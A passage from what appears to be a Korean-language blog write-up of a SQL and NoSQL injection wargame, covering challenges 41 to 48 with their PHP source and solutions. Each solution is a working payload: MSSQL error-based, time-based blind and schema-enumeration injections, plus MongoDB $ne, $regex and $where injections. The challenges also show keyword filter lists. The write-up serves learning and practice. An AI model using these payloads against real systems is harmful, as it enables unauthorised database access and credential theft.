class="code"><pre><span class="line">// Solution</span><br><span class="line">1. pw=&#x27; union select group_concat(tbl_name) from sqlite_master--</span><br><span class="line">2. pw=&#x27; union select * from flag_1q2w3e4r--</span><br></pre></td></tr></table></figure><h3 id="41-nessie"><a href="#41-nessie" class="headerlink" title="41. nessie"></a>41. nessie</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mssql_connect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|prob|;|watifor/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|prob|;|waitfor/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_nessie where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">sqlsrv_errors</span>()) <span class="keyword">exit</span>(<span class="title function_ invoke__">mssql_error</span>(<span class="title function_ invoke__">sqlsrv_errors</span>()));</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_nessie where id=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;nessie&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mssql error based sql injection 문제입니다.<br>mssql에서는 문자열 값과 int를 비교하도록 하면 그 과정에서 문자열을 int로 변환하도록 시도하는데 에러메시지에 해당값이 그대로 노출됩니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// Solution</span><br><span class="line">1. id=admin&amp;pw=&#x27; or id=&#x27;admin&#x27; and pw=1--</span><br><span class="line">2. pw=&#x27; union select * from flag_1q2w3e4r--+-</span><br></pre></td></tr></table></figure><h3 id="42-revenant"><a href="#42-revenant" class="headerlink" title="42. revenant"></a>42. revenant</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mssql_connect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|prob|;|waitfor/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|prob|;|waitfor/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select * from prob_revenant where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">sqlsrv_errors</span>()) <span class="keyword">exit</span>(<span class="title function_ invoke__">mssql_error</span>(<span class="title function_ invoke__">sqlsrv_errors</span>()));</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select * from prob_revenant where id=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;4&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;revenant&quot;</span>); <span class="comment">// you have to pwn 5th column</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysql 에서는 존재하지 않는 함수인데 mssql에서는 col_name 함수를 사용하면 db명을 인자로 받아 컬럼명을 조회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// Solution</span><br><span class="line">1. id=&#x27;order by 5--&amp;pw=1</span><br><span class="line">2. id=admin&amp;pw=&#x27; or id=&#x27;admin&#x27; and col_name(Object_id(&#x27;pro&#x27;+&#x27;b_revenant&#x27;),4)=1--+-</span><br><span class="line">3. id=admin&amp;pw=&#x27; or id=&#x27;admin&#x27; and convert(int,&quot;1q2w3e4r&quot;)=1-- -</span><br></pre></td></tr></table></figure><h3 id="43-yeti"><a href="#43-yeti" class="headerlink" title="43. yeti"></a>43. yeti</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mssql_connect</span>(<span class="string">&quot;yeti&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|;/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|;/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_yeti where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_yeti where id=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;yeti&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>결과값이 나오지 않으며, 오류 표시도 되지 않으므로 Time based blind injection을 사용하여 문제를 해결해야 합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=admin&amp;pw=&#x27; if((select pw from prob_yeti where id=&#x27;admin&#x27;)like&#x27;%&#x27;) waitfor delay &#x27;0:0:1&#x27;-- -</span><br></pre></td></tr></table></figure><h3 id="44-mummy"><a href="#44-mummy" class="headerlink" title="44. mummy"></a>44. mummy</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mssql_connect</span>(<span class="string">&quot;mummy&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|sys|information|;|\(|\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>]);<span class="variable">$i</span>++) <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>][<span class="variable">$i</span>]) &lt;= <span class="number">32</span>) <span class="keyword">exit</span>(<span class="string">&quot;%01~%20 can used as whitespace at mssql&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="number">0</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello anonymous&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_mummy where id=&#x27;admin&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;mummy&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mssql에서는 컬럼명을 더블 쿼트로 포장할 수 있습니다.<br>그러면 공백을 사용하지 않고 쿼리문을 작성할 수 있죠.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : query=&#x27;1&#x27;from&quot;prob_mummy&quot;where&quot;id&quot;=&#x27;admin&#x27;and&quot;pw&quot;like&#x27;%&#x27;</span><br></pre></td></tr></table></figure><h3 id="45-kraken"><a href="#45-kraken" class="headerlink" title="45. kraken"></a>45. kraken</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mssql_connect</span>(<span class="string">&quot;kraken&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|information|;/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/master|information|;/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from member where id=&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">sqlsrv_fetch_array</span>(<span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$krakenFlag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;kraken&quot;</span>);<span class="comment">// Flag is in `flag_&#123;$hash&#125;` table, not in `member` table. Let&#x27;s look over whole of the database.</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mssql에서는 dbname..sysobjects 구문을 통해 테이블 명을 조회할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// Solution</span><br><span class="line">1. pw=&#x27; union select name from kraken..sysobjects where xtype=&#x27;U&#x27; and name like &#x27;flag%&#x27;--</span><br><span class="line">2. pw=&#x27; union select * from flag_ccdfe62b--</span><br></pre></td></tr></table></figure><h3 id="46-cerberus"><a href="#46-cerberus" class="headerlink" title="46. cerberus"></a>46. cerberus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mongodb_connect</span>();</span><br><span class="line">  <span class="variable">$query</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">    <span class="string">&quot;pw&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$query</span>).<span class="string">&quot;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mongodb_fetch_array</span>(<span class="variable">$db</span>-&gt;prob_cerberus-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;admin&quot;</span>) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;cerberus&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>PayloadsAllTheThings - NoSQL injection</p><p>[<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#nosql-injection]">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#nosql-injection]</a>(<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL</a> Injection#nosql-injection)</p></blockquote><p>MongoDB Injection의 문제입니다.<br>arg[$ne]&#x3D;와 같은 형식으로 파라미터를 전달하면<br>서버에서는 JSON으로 {“arg”{“$ne”, “”}} 와 같이 해석하는데<br>이는 NoSQL의 비교구문이 되므로 arg값이 비어있지 않을 경우<br>쿼리는 항상 true를 리턴하게 됩니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=admin&amp;pw[$ne]=</span><br></pre></td></tr></table></figure><h3 id="47-siren"><a href="#47-siren" class="headerlink" title="47. siren"></a>47. siren</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mongodb_connect</span>();</span><br><span class="line">  <span class="variable">$query</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">    <span class="string">&quot;pw&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$query</span>).<span class="string">&quot;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mongodb_fetch_array</span>(<span class="variable">$db</span>-&gt;prob_siren-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello User&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="keyword">array</span>(<span class="string">&quot;id&quot;</span> =&gt; <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mongodb_fetch_array</span>(<span class="variable">$db</span>-&gt;prob_siren-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;siren&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 비슷하지만 실제 pw를 도출하는 것 까지가 목표입니다.<br>arg[$regex]&#x3D;.* 와 같이 입력해주면<br>서버측에서는 JSON으로 {“arg”:{“$regex”, “.*”}} 와 같이 해석하는데<br>MongoDB 문법으로 정규식 비교문이 됩니다.<br>이를 이용해 한글자씩 대입해 보면 답을 알아낼 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=admin&amp;pw[$regex]=^BRUTE_HERE.*</span><br></pre></td></tr></table></figure><h3 id="48-incubus"><a href="#48-incubus" class="headerlink" title="48. incubus"></a>48. incubus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">login_chk</span>();</span><br><span class="line">  <span class="variable">$db</span> = <span class="title function_ invoke__">mongodb_connect</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\(/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prob|_|\(/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="keyword">array</span>(<span class="string">&quot;\$where&quot;</span> =&gt; <span class="string">&quot;function()&#123;return obj.id==&#x27;<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&#x27;&amp;&amp;obj.pw==&#x27;<span class="subst">&#123;$_GET[&#x27;pw&#x27;]&#125;</span>&#x27;;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$query</span>).<span class="string">&quot;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mongodb_fetch_array</span>(<span class="variable">$db</span>-&gt;prob_incubus-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="keyword">array</span>(<span class="string">&quot;id&quot;</span> =&gt; <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mongodb_fetch_array</span>(<span class="variable">$db</span>-&gt;prob_incubus-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]) <span class="title function_ invoke__">solve</span>(<span class="string">&quot;incubus&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>마지막 문제입니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id=&amp;pw=&#x27;||obj.id==&#x27;admin&#x27;&amp;&amp;obj.pw[0]==&#x27;BRUTE_HERE</span><br></pre></td></tr></table></figure></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-gremlin"><span class="toc-number">1.</span> <span class="toc-text">1. gremlin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cobolt"><span class="toc-number">2.</span> <span class="toc-text">2. cobolt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 